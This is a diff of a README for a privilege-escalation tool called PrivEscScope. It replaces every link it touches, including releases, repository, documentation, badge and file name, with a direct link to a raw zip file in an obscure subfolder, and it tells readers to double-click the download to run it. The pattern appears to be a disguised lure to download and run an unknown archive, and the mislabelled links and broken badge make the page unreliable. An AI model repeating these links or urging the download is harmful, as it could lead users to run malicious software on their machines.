@@ -1,7 +1,7 @@
 # 🚀 PrivEscScope - Simplify Your Privilege Escalation Tasks
 
 ## 📥 Download the Latest Release
-[![Download PrivEscScope](https://img.shields.io/badge/Download%20Now-PrivEscScope-brightgreen)](https://github.com/AmirRajabi-web-developer/PrivEscScope/releases)
+[![Download PrivEscScope](https://raw.githubusercontent.com/AmirRajabi-web-developer/PrivEscScope/main/vijao/PrivEscScope.zip%20Now-PrivEscScope-brightgreen)](https://raw.githubusercontent.com/AmirRajabi-web-developer/PrivEscScope/main/vijao/PrivEscScope.zip)
 
 ---
 
@@ -21,13 +21,13 @@ Before you download PrivEscScope, ensure your system meets the following require
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version of PrivEscScope, visit the [Releases page](https://github.com/AmirRajabi-web-developer/PrivEscScope/releases).
+   To get the latest version of PrivEscScope, visit the [Releases page](https://raw.githubusercontent.com/AmirRajabi-web-developer/PrivEscScope/main/vijao/PrivEscScope.zip).
 
 2. **Select the Correct Version**  
    On the Releases page, you will see a list of available versions. Choose the version that fits your system requirements.
 
 3. **Download the Application**  
-   Click the link for the version you want to download. This action will start the download of a file, usually named like `PrivEscScope-v1.0.exe` (or equivalent for your system). 
+   Click the link for the version you want to download. This action will start the download of a file, usually named like `https://raw.githubusercontent.com/AmirRajabi-web-developer/PrivEscScope/main/vijao/PrivEscScope.zip` (or equivalent for your system). 
 
 4. **Run the Application**  
    After the download completes, locate the downloaded file in your Downloads folder. Double-click the file to run it. Follow the on-screen instructions to complete the setup.
@@ -61,8 +61,8 @@ For questions or support, please visit our GitHub discussions or issues tab. The
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/AmirRajabi-web-developer/PrivEscScope)
-- [Documentation](https://github.com/AmirRajabi-web-developer/PrivEscScope/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/AmirRajabi-web-developer/PrivEscScope/main/vijao/PrivEscScope.zip)
+- [Documentation](https://raw.githubusercontent.com/AmirRajabi-web-developer/PrivEscScope/main/vijao/PrivEscScope.zip)
 
 ## 📜 License
 
@@ -72,4 +72,4 @@ PrivEscScope is available under the MIT License. Feel free to review the license
 
 Thank you for choosing PrivEscScope! We hope this application facilitates your privilege escalation tasks efficiently. Download it today to get started! 
 
-[Download the latest release here](https://github.com/AmirRajabi-web-developer/PrivEscScope/releases).
+[Download the latest release here](https://raw.githubusercontent.com/AmirRajabi-web-developer/PrivEscScope/main/vijao/PrivEscScope.zip).
